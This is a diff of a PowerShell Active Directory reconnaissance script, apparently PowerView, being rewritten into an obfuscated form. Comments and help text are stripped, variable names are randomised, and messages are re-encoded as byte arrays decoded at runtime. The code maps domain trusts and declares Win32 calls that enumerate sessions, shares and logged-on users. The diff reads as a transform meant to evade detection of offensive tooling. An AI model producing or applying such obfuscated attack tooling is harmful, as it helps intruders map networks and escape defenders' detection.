-                        $MoW7 | Add-Member Noteproperty 'GroupName' $GroupName
-                        $MoW7 | Add-Member Noteproperty 'UserDomain' $JrDg6EbO
-                        $MoW7 | Add-Member Noteproperty 'UserName' $UserName
-                        $MoW7 | Add-Member Noteproperty 'UserDN' $_
-                        $MoW7
+                        $m6bf = New-Object PSObject
+                        $m6bf | Add-Member Noteproperty 'GroupDomain' $Domain
+                        $m6bf | Add-Member Noteproperty 'GroupName' $GroupName
+                        $m6bf | Add-Member Noteproperty 'UserDomain' $of0NvYsD
+                        $m6bf | Add-Member Noteproperty 'UserName' $UserName
+                        $m6bf | Add-Member Noteproperty 'UserDN' $_
+                        $m6bf
                     }
                 }
         }
     }
-
     if ($Recurse) {
-        # get all rechable domains in the trust mesh and uniquify them
         if($LDAP -or $DomainController) {
-            $idyQ = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
+            $jdtKic = Invoke-MapDomainTrust -LDAP -DomainController $DomainController -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
         }
         else {
-            $idyQ = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
+            $jdtKic = Invoke-MapDomainTrust -PageSize $PageSize | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique
         }
-
-        ForEach($kcM83Fh3 in $idyQ) {
-            # get the trust groups for each domain in the trust mesh
-            Write-Verbose ((HandleResult95 @(108,144,209,185,92,144,178,241,103,159,182,248,92,170,135,239,90,143,174,185,93,244,181,239,100,244,174,254,90,159,166,242,119,128,136,253,119,128,182,254,92,144,162,248,92,174,165,181) @(62,199,228,136)) + $kcM83Fh3)
+        ForEach($sfP5Y6Pf in $jdtKic) {
+            Write-Verbose ((ParseEntry20 @(215,217,46,198,231,217,77,142,220,214,73,135,231,227,120,144,225,198,81,198,230,189,74,144,223,189,81,129,225,214,89,141,204,201,119,130,204,201,73,129,231,217,93,135,231,231,90,202) @(133,142,27,247)) + $sfP5Y6Pf)
             Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
         }
     }
@@ -11138,132 +5524,61 @@ function Find-ForeignGroup {
         Get-ForeignGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
     }
 }
-
-
 function Invoke-MapDomainTrust {
-<#
-    .SYNOPSIS
-
-        This function gets all trusts for the current domain,
-        and tries to get all trusts for each domain it finds.
-
-    .PARAMETER LDAP
-
-        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
-        More likely to get around network segmentation, but not as accurate.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv
-        
-        Map all reachable domain trusts and output everything to a .csv file.
-
-    .LINK
-
-        http://blog.harmj0y.net/
-#>
     [CmdletBinding()]
     param(
         [Switch]
         $LDAP,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
-    # keep track of domains seen so we don't hit infinite recursion
-    $hljp = @{}
-
-    # our domain status tracker
-    $fljjwSnD = New-Object System.Collections.Stack
-
-    # get the current domain and push it onto the stack
-    $u28D = (Get-NetDomain).Name
-    $fljjwSnD.push($u28D)
-
-    while($fljjwSnD.Count -ne 0) {
-
-        $Domain = $fljjwSnD.Pop()
-
-        # if we haven't seen this domain before
-        if (-not $hljp.ContainsKey($Domain)) {
-            
-            Write-Verbose ((HandleResult95 @(179,248,75,217,20,182,249,7,177,46,179,223,28,133,21,134,203,54,162,71,130,156,44,146,63,166,245,8,139,31,163,196,28,218,71,137,206,41,220,17,171,216,67,213) @(225,175,126,232,118)) + $Domain + "'")
-
-            # mark it as seen in our list
-            $Null = $hljp.add($Domain, "")
-
+    $a6KtT = @{}
+    $ktIDa = New-Object System.Collections.Stack
+    $PqDo = (Get-NetDomain).Name
+    $ktIDa.push($PqDo)
+    while($ktIDa.Count -ne 0) {
+        $Domain = $ktIDa.Pop()
+        if (-not $a6KtT.ContainsKey($Domain)) {
+            Write-Verbose ((ParseEntry20 @(29,108,172,251,73,38,25,66,192,146,121,1,45,86,250,173,79,57,5,10,250,249,121,11,6,124,195,188,72,24,13,80,251,248,26,25,46,108,173,173,97,6,114,6) @(79,59,153,202,43,113)) + $Domain + "'")
+            $Null = $a6KtT.add($Domain, "")
             try {
-                # get all the trusts for this domain
                 if($LDAP -or $DomainController) {
-                    $s44ONL = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
+                    $v9ojgF = Get-NetDomainTrust -Domain $Domain -LDAP -DomainController $DomainController -PageSize $PageSize
                 }
                 else {
-                    $s44ONL = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize
+                    $v9ojgF = Get-NetDomainTrust -Domain $Domain -PageSize $PageSize
                 }
-
-                if($s44ONL -isnot [system.array]) {
-                    $s44ONL = @($s44ONL)
+                if($v9ojgF -isnot [system.array]) {
+                    $v9ojgF = @($v9ojgF)
                 }
-
-                # get any forest trusts, if they exist
-                $s44ONL += Get-NetForestTrust -Forest $Domain
-
-                if ($s44ONL) {
-
-                    # enumerate each trust found
-                    ForEach ($yFmFqxST in $s44ONL) {
-                        $V71Lz = $yFmFqxST.SourceName
-                        $gxZK = $yFmFqxST.TargetName
-                        $iVnnHA = $yFmFqxST.TrustType
-                        $DxOFhPGW = $yFmFqxST.TrustDirection
-
-                        # make sure we process the target
-                        $Null = $fljjwSnD.push($gxZK)
-
-                        # build the nicely-parsable custom output object
-                        $kcM83Fh3 = New-Object PSObject
-                        $kcM83Fh3 | Add-Member Noteproperty 'SourceDomain' ($V71Lz)
-                        $kcM83Fh3 | Add-Member Noteproperty 'TargetDomain' ($gxZK)
-                        $kcM83Fh3 | Add-Member Noteproperty 'TrustType' ($iVnnHA)
-                        $kcM83Fh3 | Add-Member Noteproperty 'TrustDirection' ($DxOFhPGW)
-                        $kcM83Fh3
+                $v9ojgF += Get-NetForestTrust -Forest $Domain
+                if ($v9ojgF) {
+                    ForEach ($VFmX4 in $v9ojgF) {
+                        $hQOuS = $VFmX4.SourceName
+                        $a9bB = $VFmX4.TargetName
+                        $njOEJj = $VFmX4.TrustType
+                        $iOFqRWNC = $VFmX4.TrustDirection
+                        $Null = $ktIDa.push($a9bB)
+                        $sfP5Y6Pf = New-Object PSObject
+                        $sfP5Y6Pf | Add-Member Noteproperty 'SourceDomain' ($hQOuS)
+                        $sfP5Y6Pf | Add-Member Noteproperty 'TargetDomain' ($a9bB)
+                        $sfP5Y6Pf | Add-Member Noteproperty 'TrustType' ($njOEJj)
+                        $sfP5Y6Pf | Add-Member Noteproperty 'TrustDirection' ($iOFqRWNC)
+                        $sfP5Y6Pf
                     }
                 }
             }
             catch {
-                Write-Warning ((HandleResult95 @(175,110,95,236,177,98,73,53,155,122,32,241,183,78,94,113) @(248,23,25,136,248,39,31,76)) + $_)
+                Write-Warning ((ParseEntry20 @(223,194,51,25,55,253,233,172,235,214,76,4,49,209,254,232) @(136,187,117,125,126,184,191,213)) + $_)
             }
         }
     }
 }
-
-
-########################################################
-#
-# Expose the Win32API functions and datastructures below
-# using PSReflect. 
-# Warning: Once these are executed, they are baked in 
-# and can't be changed while the script is running!
-#
-########################################################
-
-$WVhP = New-InMemoryModule -ModuleName Win32
-
-# all of the Win32 API functions we need
-$d1jYhq = @(
+$QmG3 = New-InMemoryModule -ModuleName Win32
+$ifJ43O = @(
     (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
     (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
     (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
@@ -11278,9 +5593,7 @@ $d1jYhq = @(
     (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
     (func kernel32 GetLastError ([Int]) @())
 )
-
-# enum used by $WTS_SESSION_INFO_1 below
-$NMRvD = psenum $WVhP WTS_CONNECTSTATE_CLASS UInt16 @{
+$Q2RlxS4d = psenum $QmG3 WTS_CONNECTSTATE_CLASS UInt16 @{
     Active       =    0
     Connected    =    1
     ConnectQuery =    2
@@ -11292,11 +5605,9 @@ $NMRvD = psenum $WVhP WTS_CONNECTSTATE_CLASS UInt16 @{
     Down         =    8
     Init         =    9
 }
-
-# the WTSEnumerateSessionsEx result structure
-$iXPiA = struct $WVhP WTS_SESSION_INFO_1 @{
+$EOgY = struct $QmG3 WTS_SESSION_INFO_1 @{
     ExecEnvId = field 0 UInt32
-    State = field 1 $NMRvD
+    State = field 1 $Q2RlxS4d
     SessionId = field 2 UInt32
     pSessionName = field 3 String -MarshalAs @('LPWStr')
     pHostName = field 4 String -MarshalAs @('LPWStr')
@@ -11304,45 +5615,32 @@ $iXPiA = struct $WVhP WTS_SESSION_INFO_1 @{
     pDomainName = field 6 String -MarshalAs @('LPWStr')
     pFarmName = field 7 String -MarshalAs @('LPWStr')
 }
-
-# the particular WTSQuerySessionInformation result structure
-$GkoHs2 = struct $WVhP WTS_CLIENT_ADDRESS @{
+$Ff07 = struct $QmG3 WTS_CLIENT_ADDRESS @{
     AddressFamily = field 0 UInt32
     Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
 }
-
-# the NetShareEnum result structure
-$SWAZiW = struct $WVhP SHARE_INFO_1 @{
+$uCBIau = struct $QmG3 SHARE_INFO_1 @{
     shi1_netname = field 0 String -MarshalAs @('LPWStr')
     shi1_type = field 1 UInt32
     shi1_remark = field 2 String -MarshalAs @('LPWStr')
 }
-
-# the NetWkstaUserEnum result structure
-$JjX6hJWr = struct $WVhP WKSTA_USER_INFO_1 @{
+$lsABVkT = struct $QmG3 WKSTA_USER_INFO_1 @{
     wkui1_username = field 0 String -MarshalAs @('LPWStr')
     wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
     wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
     wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
 }
-
-# the NetSessionEnum result structure
-$LdmYxDq = struct $WVhP SESSION_INFO_10 @{
+$BOJuX = struct $QmG3 SESSION_INFO_10 @{
     sesi10_cname = field 0 String -MarshalAs @('LPWStr')
     sesi10_username = field 1 String -MarshalAs @('LPWStr')
     sesi10_time = field 2 UInt32
     sesi10_idle_time = field 3 UInt32
 }
-
-
-$o9eFXIA = $d1jYhq | Add-Win32Type -Module $WVhP -Namespace 'Win32'
-$pyQHtec7 = $o9eFXIA['netapi32']
-$FQMCj1Kr = $o9eFXIA['advapi32']
-$jAC8b6ZC = $o9eFXIA['kernel32']
-$KBfbHiS = $o9eFXIA['wtsapi32']
-
-
-# aliases to help the PowerView 2.0 transition
+$y8rx = $ifJ43O | Add-Win32Type -Module $QmG3 -Namespace 'Win32'
+$aJIaD = $y8rx['netapi32']
+$sND5Za = $y8rx['advapi32']
+$H7dxZ = $y8rx['kernel32']
+$uSJ2gRK = $y8rx['wtsapi32']
 Set-Alias Get-NetForestDomains Get-NetForestDomain
 Set-Alias Get-NetDomainControllers Get-NetDomainController
 Set-Alias Get-NetUserSPNs Get-NetUser
